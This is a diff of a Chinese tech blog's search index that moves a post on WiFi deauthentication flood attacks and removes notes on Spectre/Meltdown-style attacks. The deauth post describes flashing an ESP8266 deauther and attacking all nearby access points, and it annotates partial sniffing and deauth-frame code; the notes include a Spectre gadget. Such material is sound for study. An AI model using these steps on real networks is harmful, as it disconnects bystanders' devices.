@@ -152,30 +152,10 @@
 <p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
 <p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
 <p>得到物理地址：0x3240</p>
-]]></content>
+<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2>]]></content>
       <categories>
         <category>操作系统</category>
       </categories>
-  </entry>
-  <entry>
-    <title>Fallout: Leaking Data on Meltdown-resistant CPUs论文笔记</title>
-    <url>/2021/12/09/Fallout-Leaking-Data-on-Meltdown-resistant-CPUs/</url>
-    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>​        为了提高从内存里读取数据的速度，我们设立了多级缓存。缓存速度比内存要快很多，可以用来存储一些经常用到的数据，这样可以调高数据的利用效率。</p>
-<p>​        CPU会认为当前访问的某个地址的数据时，它周围的数据随后也会大概率被访问到，所以周围数据会一并放到缓存中，以便于取用。</p>
-<h2 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h2><p>​        某些指令的准备工作，和一些不依赖前面指令运行结果的指令，都可以提前运行，然后把结果放入缓存。如果轮到该指令运行，就直接将缓存内数据写入内存。</p>
-<h2 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h2><p>​        遇到分支跳转时，按照之前的经验，如果某个分支经常被执行，那后续再去这个分支的概率一定很大，那这样咱们预测后面会去到这个分支，就提前把这个分支后面指令能做的工作先做了。</p>
-<h2 id="幽灵与熔断"><a href="#幽灵与熔断" class="headerlink" title="幽灵与熔断"></a>幽灵与熔断</h2><p>​        如果分支预测被恶意利用，收到恶意程序欺骗，那么就会在关键时候预测失败，从而执行一些本不该执行的指令。虽然只将数据存储在缓存中，但通过访问内存时间的不同（放入缓存的数据访问时间会明显较短），就可以知道哪一块地址被缓存了。    </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt; array1_size)</span><br><span class="line">&#123;</span><br><span class="line">   temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>一开始的x都小于array1_size，欺骗CPU不断提前进行分支预测。但当真正的恶意x（某个地址单元）（大于array1_size）到来时，CPU还是把if里面的执行结果放入了缓存。只是在指令真正开始执行时，虽然缓存不被输出，但访问的时间会明显较短，数一下缓存的内存到数组开头的偏移距离，可以推出这个地址单元的值。</p>
-<h2 id="缓解机制"><a href="#缓解机制" class="headerlink" title="缓解机制"></a>缓解机制</h2><p>Meltdown攻击最有效的方式就是KAISER/KPTI。KAISER/KPTI方案中要求操作系统维护两个页表，一个页表给用户程序使用，一个给kernel自己使用。并且确保程序所使用的页表不会映射高优先级的页面，即不会映射kernel的页面。</p>
-<p>两个页表的切换，会导致CR3（控制寄存器：用于控制和确定处理器的操作模式以及当前执行任务的特性）的重新加载，从而引起TLB刷新，进而降低内存的访问速度。如果某些应用场景需要大量的内核和用户空间切换（两个页表之间的切换），会造成较高的性能开销。</p>
-<h1 id="最新的漏洞"><a href="#最新的漏洞" class="headerlink" title="最新的漏洞"></a>最新的漏洞</h1><p>​        硬件修复后，上述缓解机制被禁用，该文章说明了最新的抗熔断处理器仍是具有数据泄漏的潜在风险，仍易受到熔断攻击。</p>
-<p>​        待更新</p>
-]]></content>
-      <tags>
-        <tag>幽灵与熔断</tag>
-      </tags>
   </entry>
   <entry>
     <title>基础知识</title>
@@ -1140,58 +1120,6 @@
       </categories>
   </entry>
   <entry>
-    <title>无线DOS之取消验证洪水攻击</title>
-    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
-
-<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
-<p>简单配置一下</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
-
-<p>烧录</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
-
-<p>这时，esp8266会建立一个WIFI，</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
-
-<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
-
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
-
-<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
-<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
-<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
-<ol>
-<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
-<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
-</ol>
-<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
-<p>首先是扫描：</p>
-<p>​    AP模式扫描周围的AP。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>进入嗅探模式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
-
-<p>以上是我们需要构造的mac帧头格式</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
-
-<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>软件安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>深入理解计算机系统一</title>
     <url>/2021/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%80/</url>
     <content><![CDATA[<h4 id="位："><a href="#位：" class="headerlink" title="位："></a>位：</h4><p>​        计算机中数据储存的基本单位，源程序实际上就是由0和1组成的位序列，8位等于一个字节，系统中的所有信息都是由一串比特位来表示的。</p>
@@ -1459,6 +1387,58 @@
 ]]></content>
       <categories>
         <category>CSAPP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无线DOS之取消验证洪水攻击</title>
+    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<ol>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+</ol>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+
+<p>以上是我们需要构造的mac帧头格式</p>
